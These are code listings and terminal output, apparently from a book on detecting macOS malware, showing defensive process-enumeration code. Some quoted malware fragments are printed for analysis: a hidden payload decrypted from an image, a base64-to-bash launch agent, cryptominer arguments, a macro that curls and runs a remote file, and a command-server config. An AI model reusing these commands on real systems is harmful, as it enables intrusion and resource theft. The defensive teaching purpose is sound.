["```\n#import <libproc.h>\n#import <sys/sysctl.h>\n\nint32_t processesCount = 0;\nsize_t length = sizeof(processesCount);\n\nsysctlbyname(\"kern.maxproc\", &processesCount, &length, NULL, 0); \n```", "```\npid_t* pids = calloc((unsigned long)processesCount, sizeof(pid_t));\nprocessesCount = proc_listallpids(pids, processesCount*sizeof(pid_t)); \n```", "```\n% **./enumerateProcesses**\nFound 450 running processes\n\nPIDs: (\n    53355,\n    53354,\n    53348,\n    ...\n    517,\n    515,\n    514,\n    1,\n    0\n) \n```", "```\nNSData* getAuditToken(pid_t pid) {\n\n    task_name_t task = {0};\n    audit_token_t token = {0};\n    mach_msg_type_number_t infoSize = TASK_AUDIT_TOKEN_COUNT;\n\n  ❶ task_name_for_pid(mach_task_self(), pid, &task);\n  ❷ task_info(task, TASK_AUDIT_TOKEN, (integer_t*)&token, &infoSize);\n\n ❸ return [NSData dataWithBytes:&token length:sizeof(audit_token_t)];\n} \n```", "```\nchar path[PROC_PIDPATHINFO_MAXSIZE] = {0};\nproc_pidpath(pid, path, PROC_PIDPATHINFO_MAXSIZE); \n```", "```\n% **./enumerateProcesses**\nFound 450 running processes\n\n(57312):/Applications/Signal.app/Contents/MacOS/Signal\n(41461):/Applications/Safari.app/Contents/MacOS/Safari\n(40214):/Users/User/**.local**/softwareupdate\n(29853):/System/Applications/Messages.app/Contents/MacOS/Messages\n(11242):/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock\n...\n(304):/usr/libexec/UserEventAgent\n(1):/sbin/launchd \n```", "```\nint main(int argc, const char* argv[]) {\n    ...\n    unlink(argv[0]); \n```", "```\nNSString* path = @\"/Users/User/.mdworker\";\nNSString* name = path.lastPathComponent; \n```", "```\nNSRunningApplication* application =\n[NSRunningApplication runningApplicationWithProcessIdentifier:pid];\nif(nil != application) {\n    NSBundle* bundle = [NSBundle bundleWithURL:application.bundleURL];\n    NSString* name = bundle.infoDictionary[@\"CFBundleName\"];\n} \n```", "```\n\"tail -c +1381 \\\"/Volumes/Install/Installer.app/Contents/Resources/main.png\\\" |\nopenssl enc -aes-256-cbc -salt -md md5 -d -A -base64 -out /tmp/ZQEifWNV2l -pass\n\\\"pass:0.6effariGgninthgiL0.6\\\" && chmod 777 /tmp/ZQEifWNV2l ... && rm -rf /tmp/ZQEifWNV2l\" \n```", "```\n<key>ProgramArguments</key>\n<array>\n    <string>sh</string>\n    <string>-c</string>\n    <string>echo aWYgcHMg ... Zmk= | base64 --decode | bash</string>\n</array> \n```", "```\n\"--currency\",\n\"monero\",\n\"-o\",\n\"pool.graft.hashvault.pro:7777\",\n\"-u\",\n\"G81Jc3KHStAWJjjBGzZKCvEnwCeRZrHkrUKj ... 6ophndAuBKuipjpFiizVVYzeAJ\",\n\"-p\",\n\"qbix:greg@qbix.com\",\n... \n```", "```\nint mib[3] = {0};\nint systemMaxArgs = 0;\n\nsize_t size = sizeof(systemMaxArgs);\n\nmib[0] = CTL_KERN;\nmib[1] = KERN_ARGMAX;\n\n❶ sysctl(mib, 2, &systemMaxArgs, &size, NULL, 0);\n\n❷ char* arguments = malloc(systemMaxArgs); \n```", "```\nsize = (size_t)systemMaxArgs;\n\nmib[0] = CTL_KERN;\nmib[1] = KERN_PROCARGS2;\nmib[2] = processID;\n\nsysctl(mib, 3, arguments, &size, NULL, 0); \n```", "```\nint numberOfArgs = 0;\nNSMutableArray* extractedArguments = [NSMutableArray array];\n\n❶ memcpy(&numberOfArgs, arguments, sizeof(numberOfArgs));\n❷ parser = arguments + sizeof(numberOfArgs);\n\n❸ while(NULL != *++parser);\n❹ while(NULL == *++parser);\n\nwhile(extractedArguments.count < numberOfArgs) {\n  ❺ [extractedArguments addObject:[NSString stringWithUTF8String:parser]];\n    parser += strlen(parser) + 1;\n} \n```", "```\n% **./enumerateProcesses**\n...\n(14026):/Applications/CalendarFree.app/Contents/Frameworks/\nCoinstash_XMRSTAK.framework/Resources/xmr-stak\n...\narguments: (\n\"/Applications/CalendarFree.app/Contents/Frameworks/Coinstash_XMRSTAK.\nframework/Resources/xmr-stak\",\n\"--currency\",\n\"monero\",\n\"-o\",\n\"pool.graft.hashvault.pro:3333\",\n\"-u\",\n\"G81Jc3KHStAWJjjBGzZKCvEnwCeRZrHkrUKji9NSDLtJ6Evhhj43DYP7dMrYczz5KYjfw\n6ophndAuBKuipjpFiizVVYzeAJ\",\n\"-p\",\n\"qbix:greg@qbix.com\",\n...\n) \n```", "```\nsur = \"https://nzssdm.com/assets/mt.dat\"\nspath = \"/tmp/\": i = 0\n\nDo\n    spath = spath & Chr(Int(Rnd * 26) + 97)\n    i = i + 1\nLoop Until i > 12\nspath = spath\n\n❶ res = system(\"curl -o \" & spath & \" \" & sur)\n❷ res = system(\"chmod +x \" & spath)\n❸ res = popen(spath, \"r\") \n```", "```\nstruct kinfo_proc {\n    struct  extern_proc kp_proc;    /* proc structure */\n    struct  eproc {\n        struct  proc* e_paddr;      /* address of proc */\n        ...\n        pid_t   e_ppid;             /* parent process id */\n        ...\n    } kp_eproc;\n}; \n```", "```\npid_t parent = -1;\n\nstruct kinfo_proc processStruct = {0};\nsize_t procBufferSize = sizeof(processStruct);\n\nint mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, processID};\n\nsysctl(mib, 4, &processStruct, &procBufferSize, NULL, 0);\nparent = processStruct.kp_eproc.e_ppid; \n```", "```\n% **./enumerateProcesses**\n...\n(2286):/usr/bin/curl\n...\nparent: /Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word (2283) \n```", "```\n% **ps aux**\nUSER     PID  ... COMMAND\nPatrick  2726 ... /System/Applications/Calculator.app/Contents/MacOS/Calculator\n% **ps aux -o ppid 2726**\nUSER      PID     ...    PPID\nPatrick   27264   ...    1 \n```", "```\n% **./enumerateProcesses**\n...\n(2726):/System/Applications/Calculator.app/Contents/MacOS/Calculator\n...\nparent: (1) launchd \n```", "```\n#import <dlfcn.h>\n\npid_t getResponsibleParent(pid_t child) {\n    pid_t (*getRPID)(pid_t pid) =\n    dlsym(RTLD_NEXT, \"responsibility_get_pid_responsible_for_pid\");\n    ... \n```", "```\nif(NULL != getRPID) {\n    pid_t parent = getRPID(child);\n} \n```", "```\n% **./enumerateProcesses**\n...\n(10540)/System/Library/Frameworks/WebKit.framework/Versions/A/\nXPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/\ncom.apple.WebKit.WebContent\n...\nparent: (1) launchd\nresponsible parent: (8943) Safari \n```", "```\n% **./enumerateProcesses**\n...\n(2726):/System/Applications/Calculator.app/Contents/MacOS/Calculator\n...\nparent: (1) launchd\nresponsible parent: (2726) Calculator \n```", "```\n#import <AppKit/AppKit.h>\npid_t pid = <some process id>;\n\nProcessSerialNumber psn = {kNoProcess, kNoProcess};\nGetProcessForPID(pid, &psn);\n\nprintf(\"Process Serial Number (high, low): %d %d\\n\", psn.highLongOfPSN, psn.lowLongOfPSN); \n```", "```\nNSDictionary* processInfo = nil;\nProcessSerialNumber psn = {kNoProcess, kNoProcess};\n\nGetProcessForPID(pid, &psn);\n\nprocessInfo = CFBridgingRelease(ProcessInformationCopyDictionary(&psn,\n(UInt32)kProcessDictionaryIncludeAllInformationMask)); \n```", "```\nProcessSerialNumber ppsn = {kNoProcess, kNoProcess};\n\nppsn.lowLongOfPSN = [processInfo[@\"ParentPSN\"] longLongValue] & 0x00000000FFFFFFFFLL;\nppsn.highLongOfPSN = ([processInfo[@\"ParentPSN\"] longLongValue] >> 32) & 0x00000000FFFFFFFFLL; \n```", "```\n% **./enumerateProcesses**\n...\n(2726):/System/Applications/Calculator.app/Contents/MacOS/Calculator\n...\nparent: (1) launchd\nresponsible parent: (2726) Calculator\napplication services parent: (21264) Finder \n```", "```\nxpc_object_t procInfoRequest = NULL;\nxpc_object_t sharedMemory = NULL;\nxpc_object_t __autoreleasing response = NULL;\n\nint result = 0;\nint64_t xpcError = 0;\nvoid* handle = NULL;\nuint64_t bytesWritten = 0;\nvm_address_t processInfoBuffer = 0;\n\nstatic int (*xpc_pipe_interface_routine_FP)\n❶ (xpc_pipe_t, int, xpc_object_t, xpc_object_t*, int) = NULL;\n\n❷ struct xpc_global_data* globalData = NULL;\n❸ size_t processInfoLength = 0x100000; \n```", "```\nvm_allocate(mach_task_self(), &processInfoBuffer,\nprocessInfoLength, VM_FLAGS_ANYWHERE|VM_FLAGS_PURGABLE);\n\nsharedMemory = xpc_shmem_create((void*)processInfoBuffer, processInfoLength); \n```", "```\npid_t pid = <some process id>;\nprocInfoRequest = xpc_dictionary_create(NULL, NULL, 0);\n\nxpc_dictionary_set_int64(procInfoRequest, \"pid\", pid);\nxpc_dictionary_set_value(procInfoRequest, \"shmem\", sharedMemory); \n```", "```\nstruct xpc_global_data\n{\n    uint64_t a;\n    uint64_t xpc_flags;\n    mach_port_t task_bootstrap_port;\n    xpc_object_t xpc_bootstrap_pipe;\n};\n\nstruct _os_alloc_once_s\n{\n    long once;\n    void* ptr;\n};\n\nextern struct _os_alloc_once_s _os_alloc_once_table[];\n\nglobalData = (struct xpc_global_data*)_os_alloc_once_table[1].ptr; \n```", "```\n#import <dlfcn.h>\n...\nhandle = dlopen(\"/usr/lib/system/libxpc.dylib\", RTLD_LAZY);\nxpc_pipe_interface_routine_FP = dlsym(handle, \"_xpc_pipe_interface_routine\"); \n```", "```\n#define ROUTINE_DUMP_PROCESS 0x2c4\n\nresult = xpc_pipe_interface_routine_FP((__bridge xpc_pipe_t)(globalData->xpc_bootstrap_pipe),\nROUTINE_DUMP_PROCESS, procInfoRequest, &response, 0x0); \n```", "```\nbytesWritten = xpc_dictionary_get_uint64(response, \"bytes-written\");\n```", "```\nNSString* processInfo = [[NSString alloc] initWithBytes:(const void*)\nprocessInfoBuffer length:bytesWritten encoding:NSUTF8StringEncoding];\n\nprintf(\"process info (pid: %d): %s\\n\",\natoi(argv[1]), processInfo.description.UTF8String); \n```", "```\n% **./procInfo 16776**\nprocess info (pid: 16776): {\n    active count = 1\n    path = /Users/User/Library/LaunchAgents/com.apple.softwareupdate.plist\n    state = running\n\n    program = /Users/User/.local/softwareupdate\n    arguments = {\n        /Users/User/.local/softwareupdate\n        1\n    }\n\n    inherited environment = {\n        SSH_AUTH_SOCK =>\n        /private/tmp/com.apple.launchd.kEoOvPmtt1/Listeners\n    }\n\n    default environment = {\n        PATH => /usr/bin:/bin:/usr/sbin:/sbin\n    }\n    environment = {\n XPC_SERVICE_NAME => com.apple.softwareupdate\n    }\n\n    domain = gui/501 [100005]\n    ...\n    runs = 1\n    pid = 16776\n    immediate reason = speculative\n    forks = 0\n    execs = 1\n\n    spawn type = daemon (3)\n\n    properties = partial import | keepalive | runatload |\n    inferred program | system service | exponential throttling\n} \n```", "```\npath = /Users/User/Library/LaunchAgents/com.apple.softwareupdate.plist\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n...\n<plist version=\"1.0\">\n<dict>\n    <key>KeepAlive</key>\n    <true/>\n    <key>Label</key>\n    <string>com.apple.softwareupdate</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>**/Users/User/.local/softwareupdate**</string>\n        <string>1</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>SuccessfulExit</key>\n    <true/>\n</dict>\n</plist> \n```", "```\n% **pgrep iTerm2**\n932\n\n% **vmmap -w 932**\nProcess:         iTerm2 [932]\nPath:            /Applications/iTerm.app/Contents/MacOS/iTerm2\n...\n==== Non-writable regions for process 932\nREGION     START - END         DETAIL\n__TEXT     102b2b000-103247000 /Applications/iTerm.app/Contents/MacOS/iTerm2\n__LINKEDIT 103483000-103cb4000 /Applications/iTerm.app/Contents/MacOS/iTerm2\n...\n__TEXT     10da4d000-10da85000 /Applications/iTerm.app/Contents/Frameworks/libcrypto.2.dylib\n__LINKEDIT 10da91000-10dacd000 /Applications/iTerm.app/Contents/Frameworks/libcrypto.2.dylib\n... \n```", "```\n#define STDERR @\"stdError\"\n#define STDOUT @\"stdOutput\"\n\n#define EXIT_CODE @\"exitCode\"\n\nNSMutableDictionary* execTask(NSString* binaryPath, NSArray* arguments) {\n    NSTask* task = nil;\n    NSPipe* stdOutPipe = nil;\n    NSFileHandle* stdOutReadHandle = nil;\n    NSMutableDictionary* results = nil;\n    NSMutableData* stdOut = nil;\n\n results = [NSMutableDictionary dictionary];\n    task = [NSTask new];\n  ❶ stdOutPipe = [NSPipe pipe];\n    stdOutReadHandle = [stdOutPipe fileHandleForReading];\n    stdOutData = [NSMutableData data];\n  ❷ task.standardOutput = stdOutPipe;\n    task.launchPath = binaryPath;\n\n    if(nil != arguments) {\n        task.arguments = arguments;\n    }\n\n    [task launch];\n\n    while(YES == [task isRunning]) {\n      ❸ [stdOutData appendData:[stdOutReadHandle readDataToEndOfFile]];\n    }\n\n    [stdOutData appendData:[stdOutReadHandle readDataToEndOfFile]];\n    if(0 != stdOutData.length) {\n      ❹ results[STDOUT] = stdOutData;\n    }\n\n    results[EXIT_CODE] = [NSNumber numberWithInteger:task.terminationStatus];\n\n    return results;\n} \n```", "```\npid_t pid = <some process id>;\n\nNSMutableDictionary* results = execTask(@\"/usr/bin/vmmap\", @[@\"-w\", [[NSNumber\nnumberWithInt:pid] stringValue]]);\n\nNSString* output = [[NSString alloc] initWithData:results[STDOUT]\nencoding:NSUTF8StringEncoding]; \n```", "```\nNSMutableArray* dylibs = [NSMutableArray array];\n\nfor(NSString* line in\n[output componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {\n    if(YES != [line hasPrefix:@\"__TEXT\"]) {\n        continue;\n    }\n} \n```", "```\nNSRange pathOffset = {0};\nNSString* token = @\"SM=COW\";\n\npathOffset = [line rangeOfString:token];\nif(NSNotFound == pathOffset.location) {\n    continue;\n}\n\ndylib = [[line substringFromIndex:pathOffset.location+token.length]\nstringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];\n\nif(dylib != nil) {\n    [dylibs addObject:dylib];\n} \n```", "```\n% **./enumerateProcesses**\n...\n(932):/Applications/iTerm.app/Contents/MacOS/iTerm2\n...\nDynamic libraries for process iTerm2 (932):\n(\n\"/Applications/iTerm.app/Contents/MacOS/iTerm2\",\n\"/usr/lib/dyld\",\n\"/Applications/iTerm.app/Contents/Frameworks/**libcrypto.2.dylib**\",\n...\n) \n```", "```\n% **cat com.apple.audio.driver.app/Contents/MacOS/conx.wol**\n{\n    \"PO\": 80,\n    \"HO\": \"45.77.49.118\",\n    \"MU\": \"CRHHrHQuw JOlybkgerD\",\n    \"VN\": \"Mac_Vic\",\n    \"LN\": \"adobe_logs.log\",\n    \"KL\": true,\n    \"RN\": true,\n    \"PN\": \"com.apple.audio.driver\"\n} \n```", "```\nbankofamerica.com\n[enter]\nuser\n[tab]\nhunter2\n[enter] \n```", "```\n❶ int size = proc_pidinfo(pid, PROC_PIDLISTFDS, 0, 0, 0);\n\n❷ struct proc_fdinfo* fdInfo = (struct proc_fdinfo*)malloc(size);\n\n❸ proc_pidinfo(pid, PROC_PIDLISTFDS, 0, fdInfo, size); \n```", "```\nNSMutableArray* files = [NSMutableArray array];\n\n  ❶ for(int i = 0; i < (size/PROC_PIDLISTFD_SIZE); i++) {\n        struct vnode_fdinfowithpath vnodeInfo = {0};\n\n ❷ if(PROX_FDTYPE_VNODE != fdInfo[i].proc_fdtype) {\n            continue;\n        }\n\n      ❸ proc_pidfdinfo(pid, fdInfo[i].proc_fd,\n        PROC_PIDFDVNODEPATHINFO, &vnodeInfo, PROC_PIDFDVNODEPATHINFO_SIZE);\n\n      ❹ [files addObject:[NSString stringWithUTF8String:vnodeInfo.pvip.vip_path]];\n} \n```", "```\n# **./ProcessMonitor.app/Contents/MacOS/ProcessMonitor**\n\n{\n  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n  \"process\" : {\n    \"pid\" : 86903\n    \"name\" : **\"lsof\",**\n    \"path\" : \"/usr/sbin/lsof\",\n\n    \"arguments\" : [\n      \"/usr/sbin/lsof\",\n **\"-Fn\",**\n **\"-p\",**\n      \"590\"\n ],\n...\n} \n```", "```\nNSString* pidAsString = [NSNumber numberWithInt:pid].stringValue;\nNSMutableDictionary* results = execTask(@\"/usr/sbin/lsof\", @[@\"-Fn\", @\"-p\", pidAsString]); \n```", "```\nNSMutableArray* files = [NSMutableArray array];\n\nNSArray* lines = [[[NSString alloc] initWithData:results[STDOUT] ❶\nencoding:NSUTF8StringEncoding] componentsSeparatedByCharactersInSet:[NSCharacterSet\nnewlineCharacterSet]]; ❷\n\nfor(NSString* result in lines) {\n    if(YES == [result hasPrefix:@\"n\"]) { ❸\n        NSString* file = [result substringFromIndex:1];\n        [files addObject:file];\n    }\n} \n```", "```\nkill(targetPID, 0);\nif(ESRCH == errno) {\n    // Code placed here will run only if the process is dead.\n} \n```", "```\nint mib[4] =  {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid};\nsize_t size = sizeof(procInfo);\n\nsysctl(mib, 4, &procInfo, &size, NULL, 0);\nif(SZOMB == (SZOMB & procInfo.kp_proc.p_stat)) {\n    // Code placed here will run only if the process is a zombie.\n} \n```", "```\n% **file DazzleSpy/softwareupdate**\nDazzleSpy/softwareupdate: Mach-O 64-bit executable **x86_64** \n```", "```\nenum Architectures{ArchUnknown, ArchAppleSilicon, ArchIntel};\n\nNSUInteger getArchitecture(pid_t pid) {\n    NSUInteger architecture = ArchUnknown;\n    cpu_type_t type = -1;\n    size_t size = 0;\n    int mib[CTL_MAXNAME] = {0};\n    size_t length = CTL_MAXNAME;\n    struct kinfo_proc procInfo = {0};\n\n  ❶ sysctlnametomib(\"sysctl.proc_cputype\", mib, &length);\n    mib[length++] = pid;\n\n    size = sizeof(cpu_type_t);\n  ❷ sysctl(mib, (u_int)length, &type, &size, 0, 0);\n\n  ❸ if(CPU_TYPE_X86_64 == type) {\n        architecture = ArchIntel;\n    } else if(CPU_TYPE_ARM64 == type) {\n      ❹ architecture = ArchAppleSilicon;\n        mib[0] = CTL_KERN;\n        mib[1] = KERN_PROC;\n        mib[2] = KERN_PROC_PID;\n        mib[3] = pid;\n        size = sizeof(procInfo);\n\n        sysctl(mib, 4, &procInfo, &size, NULL, 0);\n      ❺ if(P_TRANSLATED == (P_TRANSLATED & procInfo.kp_proc.p_flag)) {\n            architecture = ArchIntel;\n        }\n    }\n    return architecture;\n} \n```", "```\nNSDate* getStartTime(pid_t pid) {\n    NSDate* startTime = nil;\n    struct timeval timeVal = {0};\n    struct kinfo_proc processStruct = {0};\n    size_t procBufferSize = sizeof(processStruct);\n\n    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid};\n\n    sysctl(mib, 4, &processStruct, &procBufferSize, NULL, 0); ❶\n    timeVal = processStruct.kp_proc.p_un.__p_starttime; ❷\n\n    return [NSDate dateWithTimeIntervalSince1970:timeVal.tv_sec + timeVal.tv_usec / 1.0e6]; ❸\n} \n```", "```\nint proc_pid_rusage(int pid, int flavor, rusage_info_t* buffer);\n```", "```\nstruct rusage_info_v0 resourceInfo_1 = {0};\nstruct rusage_info_v0 resourceInfo_2 = {0};\n\n❶ proc_pid_rusage(pid, RUSAGE_INFO_V0, (rusage_info_t*)&resourceInfo_1);\n\nsleep(delta);\n\n❷ proc_pid_rusage(pid, RUSAGE_INFO_V0, (rusage_info_t*)&resourceInfo_2);\n\n❸ int64_t cpuTime = (resourceInfo_2.ri_user_time - resourceInfo_1.ri_user_time)\n+ (resourceInfo_2.ri_system_time - resourceInfo_1.ri_system_time); \n```", "```\ndouble cpuUsage = 0.0f;\nmach_timebase_info_data_t timebase = {0};\n\nmach_timebase_info(&timebase);\ncpuTime = (cpuTime * timebase.numer) / timebase.denom;\n\ncpuUsage = (double)cpuTime / delta / NSEC_PER_SEC * 100; \n```", "```\n% **./enumerateProcesses**\n...\n(1641):/Applications/CalendarFree.app/Contents/MacOS/CalendarFree\n...\nCPU usage: 370.750173% \n```", "```\n% **ps u -p 1641**\nUSER   PID      %CPU ...\nuser   1641     372.4 ... \n```"]